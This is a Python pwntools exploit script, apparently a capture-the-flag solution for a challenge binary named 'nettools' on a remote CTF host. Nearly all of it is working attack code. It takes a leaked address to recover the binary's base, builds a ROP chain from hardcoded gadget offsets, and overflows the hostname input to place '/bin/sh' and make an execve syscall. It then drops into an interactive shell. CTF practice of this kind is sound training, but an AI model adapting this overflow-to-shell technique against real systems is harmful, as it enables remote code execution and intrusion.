# -- coding: utf-8 --
from pwn import *
context.log_level = "debug"
# ENV
PORT = 4001
HOST = "chals.sekai.team"
e = context.binary = ELF('./nettools')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = e.process()
    pause()

sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
se = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
ru = lambda x : p.recvuntil(x)
rl = lambda: p.recvline()
rec = lambda x : p.recv(x)

# VARIABLE

#0x000000000003b34c : lea esi, [rsp + 0x20] ; mov rdi, r14 ; call rax
# PAYLOAD
ru("leaked: ")
e.address = int(rl().strip(), 16) - 0x7a03c
log.info("PIE: %#x" %e.address)
bss = e.address + 0x7a500
pop_rdi = e.address + 0xa0ef
pop_rax = 0x000000000000ecaa + e.address
pop_rsi = 0x0000000000009c18 + e.address
syscall = 0x0000000000025adf + e.address
mov_rdx_rsi = 0x000000000005f28e + e.address
ret = 0x901a + e.address
xor_eax_eax = 0x2a4d2 + e.address
payload = b"\x00"
payload = payload.ljust(456, b"a")
payload += fit(1)
# payload += b"b"*272
payload += fit(bss)*35
payload += fit(pop_rax)
payload += b"/bin/sh\x00"
payload += fit(pop_rdi, bss)
payload += fit(xor_eax_eax)
payload += b"b"*0x28
payload += fit(pop_rdi, bss, pop_rsi, 0, mov_rdx_rsi, pop_rax, 0x3b, syscall)
sla("> ", "3")
sla("Hostname: ", payload)


p.interactive()